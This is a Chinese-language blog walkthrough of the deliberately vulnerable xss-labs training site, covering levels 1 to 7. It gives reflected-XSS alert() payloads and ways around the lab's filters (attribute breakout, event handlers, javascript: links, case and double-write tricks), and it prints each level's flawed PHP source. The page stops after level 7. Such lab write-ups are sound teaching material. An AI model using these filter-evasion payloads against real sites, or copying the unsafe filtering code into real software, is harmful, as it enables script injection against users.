@@ -1,0 +1,928 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>XSS-and-Security-Labs：xss-labs - Rabbit's Blog</title>
+
+  
+    <meta name="description" content="do0dl3&#x2F;xss-labs: xss 跨站漏洞平台 (github.com)  level 1 观察地址栏得知是GET请求，参数是name，值为test 修改参数值定位位置，发现是在 h2标签内，判断为反射型xss 于是直接在把name参数赋值为： &lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;  从浏览器观察直接弹出来了，查看一下源码，发现有一个str变">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-labs">
+<meta property="og:url" content="https://zero-yi7.github.io/2023/02/21/xss-labs/index.html">
+<meta property="og:site_name" content="Rabbit&#39;s Blog">
+<meta property="og:description" content="do0dl3&#x2F;xss-labs: xss 跨站漏洞平台 (github.com)  level 1 观察地址栏得知是GET请求，参数是name，值为test 修改参数值定位位置，发现是在 h2标签内，判断为反射型xss 于是直接在把name参数赋值为： &lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;  从浏览器观察直接弹出来了，查看一下源码，发现有一个str变">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301492.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301301.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301175.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301329.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301183.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301665.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301473.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301286.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301126.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301521.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301191.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301788.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301771.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301403.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301859.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302726.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302997.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302112.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302765.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302809.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302842.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302164.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302616.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302599.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302676.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302749.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302078.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302579.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302875.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302520.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302800.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302031.png">
+<meta property="article:published_time" content="2023-02-21T12:46:25.000Z">
+<meta property="article:modified_time" content="2023-02-21T12:46:25.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301492.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+  
+    <link rel="shortcut icon" href="https://favorably-7690.oss-cn-beijing.aliyuncs.com/icon/%E5%85%94%E5%AD%90%20(2).png">
+  
+
+  
+    
+<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
+
+  
+
+  
+</head><body>
+
+
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/XSS-and-Security-Labs/logo-htb.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/XSS-and-Security-Labs/index.html"><div class="main" ff="title">XSS-and-Security-Labs</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/XSS-and-Security-Labs/" placeholder="在文档中搜索..."></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item" title="靶场实战" href="/wiki/"><span>靶场实战</span></a></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">Start</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/index.html#start"><span class="toc-text">Web 安全靶场与 XSS 挑战文档</span></a></div><div class="widget-header dis-select"><span class="name">Hack The Box</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/index%20-%202.html"><span class="toc-text">Hack The Box (HTB)</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Precious.html"><span class="toc-text">Precious — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/MonitorsTwo.html"><span class="toc-text">MonitorsTwo — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Inject.html"><span class="toc-text">Inject — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Busqueda.html"><span class="toc-text">Busqueda — Hack The Box Machine</span></a></div><div class="widget-header dis-select"><span class="name">XSS Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Google%20XSS%20Game.html"><span class="toc-text">Google XSS Game</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/XSS%20Challenges.html"><span class="toc-text">XSS Challenges</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/xss-labs.html"><span class="toc-text">xss-labs</span></a></div><div class="widget-header dis-select"><span class="name">File upload Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Upload-labs.html"><span class="toc-text">Upload-labs 靶场</span></a></div><div class="widget-header dis-select"><span class="name">SQL injection</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs.html"><span class="toc-text">sqli-labs 靶场（手工注入）</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs-SQLMap.html"><span class="toc-text">sqli-labs 靶场使用 SQLMap 注入（1-25 关）</span></a></div><div class="widget-header dis-select"><span class="name">Comprehensive shooting range</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/DVWA-master.html"><span class="toc-text">DVWA 靶场</span></a></div><div class="widget-header dis-select"><span class="name">Reproducible vulnerability</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Reproducible%20vulnerability.html"><span class="toc-text">已知漏洞复现与验证</span></a></div></widget>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/XSS-and-Security-Labs/index.html">XSS-and-Security-Labs</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2023-02-21T12:46:25.000Z">2023-02-21</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>xss-labs</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">do0dl3/xss-labs: xss 跨站漏洞平台 (github.com)</a></p>
+</blockquote>
+<h2 id="level-1">level 1</h2>
+<p>观察地址栏得知是<code>GET</code>请求，参数是<code>name</code>，值为<code>test</code></p>
+<p>修改参数值定位位置，发现是在 <code>h2</code>标签内，判断为反射型<code>xss</code></p>
+<p>于是直接在把<code>name</code>参数赋值为：</p>
+<pre><code class="language-js">&lt;script&gt;alert('xss')&lt;/script&gt;
+</code></pre>
+<p>从浏览器观察直接弹出来了，查看一下源码，发现有一个<code>str</code>变量，值是<code>name</code>，同时<code>str</code>变量又被放在了<code>h2</code>标签中，且没做任何过滤处置。</p>
+<pre><code class="language-php">$str = $_GET[&quot;name&quot;];
+echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301492.png" alt="image-20230204160317360"></p>
+<h2 id="level-2">level 2</h2>
+<p>从地址栏观察<code>URL</code>发现依旧是<code>GET</code>方式来传递参数，不言而喻是反射型<code>XSS</code></p>
+<p>使用第一关的<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，发现并没有出现弹窗，查看页面源代码，发现在<code>h2</code>标签中，<code>&lt;script&gt;</code>的<code>&lt;&gt;</code>被<code>HTML</code>实体化了</p>
+<ul>
+<li>&lt; --&gt; <code>&amp;lt;</code></li>
+<li>&gt; --&gt; <code>&amp;gt;</code></li>
+</ul>
+<p>但 input 标签中的 value 参数没有被 HTML 编码，于是用<code>&quot;&gt;</code>分别闭合<code>value</code>属性和<code>input</code>标签，最后用<code>//</code>注释后面的<code>&quot;&gt;</code></p>
+<pre><code class="language-js">// payload
+&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;//
+</code></pre>
+<p>最后在 less-2.php 中查看，发现标签<code>h2</code>之所以被编码，是因为有<code>htmlspecialchars()</code>函数，换言之在网页上输入的字符会经过<code>htmlspecialchars()</code>函数对其进行 HTML 实体才会展示在页面上。</p>
+<blockquote>
+<p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。</p>
+</blockquote>
+<pre><code class="language-php">$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level2.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301301.png" alt="image-20230204173901770"></p>
+<center style="color:#C0C0C0;text-decoration:underline">页面源代码</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301175.png" alt="image-20230204173031760"></p>
+<center style="color:#C0C0C0;text-decoration:underline">闭合在标签外构造 XSS</center>
+<h2 id="level-3">level 3</h2>
+<p>修改参数值定位具体位置，发现和 level 2 是一样的，在<code>h2</code>和<code>input</code>标签中</p>
+<p>顾忌到会有编码之类，使用<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>来测试，然后 Ctrl + U 查看页面源代码。果不其然，与 level 2 不同的是，这关<code>h2</code>和<code>input</code>标签中的<code>str</code>变量皆难逃被编码之命</p>
+<ul>
+<li>&lt; --&gt; <code>&amp;lt;</code></li>
+<li>&gt; --&gt; <code>&amp;gt;</code></li>
+</ul>
+<p>因为过滤了<code>&lt;&gt;</code>，这说明不可以用新标签，只能在标签内通过<code>'</code>闭合前面的属性的方式，为后面新增属性来绕过，与此同时想到的是“鼠标事件”</p>
+<pre><code class="language-js">// 用 ' 闭合 value 的值，新增点击事件，在 input 框中去点击一下即可触发
+// 根据源码，闭合需用单引号
+' onclick ='javascript:alert(1)'//
+</code></pre>
+<pre><code class="language-php">$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value='&quot;.htmlspecialchars($str).&quot;'&gt;	
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301329.png" alt="image-20230204180054752"></p>
+<center style="color:#C0C0C0;text-decoration:underline">页面源代码</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301183.png" alt="image-20230204181312093"></p>
+<center style="color:#C0C0C0;text-decoration:underline">新增属性构造 XSS</center>
+<h2 id="level-4">level 4</h2>
+<p>修改参数值定位具体位置，依旧是在<code>h2</code>和<code>input</code>标签中，用<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>来测试，查看页面源代码，发现<code>h2</code>标签的参数依旧被 HTML 实体，仍然是<code>&lt;&gt;</code>字符</p>
+<p>但与之前不同的是，<code>input</code>标签中的<code>value</code>属性的值，没有出现<code>&lt;&gt;</code>字符，所以还是用闭合属性新增鼠标事件的方式来绕过</p>
+<pre><code class="language-js">&quot; onclick =&quot;javascript:alert(1)&quot;//
+</code></pre>
+<p>最后在 less-4.php 中查看，出现了<code>str_replace() 函数</code></p>
+<ul>
+<li><code>str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</code> --&gt; 在 str 变量中，将<code>&lt;&gt;</code>字符替换为空</li>
+<li><code>htmlspecialchars() 函数</code> --&gt; 把一些预定义的字符转换为 HTML 实体。</li>
+</ul>
+<pre><code class="language-php">$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301665.png" alt="image-20230204202256816"></p>
+<center style="color:#C0C0C0;text-decoration:underline">页面源代码</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301473.png" alt="image-20230204202828749"></p>
+<center style="color:#C0C0C0;text-decoration:underline">点击事件</center>
+<h2 id="level-5">level 5</h2>
+<ol>
+<li>
+<p>用<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>来测试，在<code>h2</code>标签中仍是<code>&lt;&gt;</code>字符被 HTML 实体了，而<code>input</code>标签的<code>value</code>属性中，完整的<code>script</code>被<code>_</code>断开了</p>
+<ul>
+<li><code>script</code> --&gt; <code>scr_ipt</code></li>
+</ul>
+</li>
+<li>
+<p>尝试<code>&quot; onclick =&quot;javascript:alert(1)&quot;//</code>，发现在<code>h2</code>标签中<code>&quot;</code>双引号被 HTML 实体了，而<code>input</code>标签的<code>value</code>属性中的值，完整的<code>onclick</code>被<code>_</code>断开了</p>
+<ul>
+<li><code>onclick</code> --&gt; <code>o_nclick</code></li>
+</ul>
+</li>
+<li>
+<p>于是换一种思路，用<code>&quot;&gt;</code> 来闭合 input 标签，利用<code>a</code>标签的<code>href</code>属性可以执行 JavaScript 伪协议的特性，绕过众多检测</p>
+</li>
+</ol>
+<pre><code class="language-js">&quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;//
+
+// 看到还有一种方式，可直接触发
+&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;
+</code></pre>
+<ol start="4">
+<li>最后在 less-5.php 中查看，出现了<code>strtolower() 函数</code></li>
+</ol>
+<ul>
+<li><code>strtolower() 函数</code> --&gt; 把字符串转换为小写，赋值给<code>str</code>变量，这样大小写绕过就失效了</li>
+<li><code>str_replace</code> --&gt; 加入了<code>_</code>破坏完整的字符</li>
+</ul>
+<pre><code class="language-php">$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301286.png" alt="image-20230204204617056"></p>
+<center style="color:#C0C0C0;text-decoration:underline">测试一</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301126.png" alt="image-20230204204936057"></p>
+<center style="color:#C0C0C0;text-decoration:underline">测试二</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301521.png" alt="image-20230204210709334"></p>
+<center style="color:#C0C0C0;text-decoration:underline">JavaScript 伪协议</center>
+<h2 id="level-6">level 6</h2>
+<p>用<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>来测试，发现在<code>h2</code>标签中仍是<code>&lt;&gt;</code>字符被 HTML 实体了，而<code>input</code>标签的<code>value</code>属性中，完整的<code>script</code>被<code>_</code>断开了</p>
+<p>尝试点击事件<code>&quot; onclick =&quot;javascript:alert(1)&quot;//</code>，发现在<code>h2</code>标签中<code>&quot;</code>双引号被 HTML 实体了，而<code>input</code>标签的<code>value</code>属性中的值，完整的<code>onclick</code>被<code>_</code>断开了</p>
+<p>试一下伪协议<code>&quot;&gt; &lt;a href=javascript:alert(1)&gt;1&lt;/a&gt;//</code>，完整的<code>href</code>被<code>_</code>断开了</p>
+<p>于是使用*<u>大小写绕过</u>*</p>
+<pre><code class="language-js">// 点击事件大小写绕过
+&quot; ONCLICK =&quot;alert(1)&quot;//
+
+// 伪协议大小写绕过
+&quot;&gt;&lt;a HREF=javascript:alert(1)&gt;xss&lt;/a&gt;//
+</code></pre>
+<p>查看 level6.php，可以看到 str_replace 函数分别破坏了<code>&lt;script、on、src、data、href</code>等元素。h2 标签处做了 HTML 实体</p>
+<pre><code class="language-php">$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301191.png" alt="image-20230205202655501"></p>
+<h2 id="level-7">level 7</h2>
+<p>通过测试，发现 input 标签的 value 属性的值 <code>script、on、href</code>被直接替代为了空，h2 标签依旧是 HTML 实体了</p>
+<p>于是通过**<u><em>双写绕过</em></u>**的方式去绕过检测</p>
+<pre><code class="language-js">// script
+&quot;&gt;&lt;scrscriptipt&gt;alert('xss')&lt;/scrscriptipt&gt;
+
+// href 和 script，伪协议
+&quot;&gt; &lt;a hrhrefef=javascscriptript:alert(1)&gt;1&lt;/a&gt;//
+
+// 点击事件
+&quot; oonnclick =&quot;javascscriptript:alert(1)&quot;//
+</code></pre>
+<p>查看 level7.php，可以看到 str_replace 函数分别把<code>&lt;script、on、src、data、href</code>替代为了空</p>
+<p>h2 标签处做了 HTML 实体，<em>strtolower</em>()函数把字符串转换为小写</p>
+<pre><code class="language-php">$str =strtolower( $_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301788.png" alt="image-20230205205033970"></p>
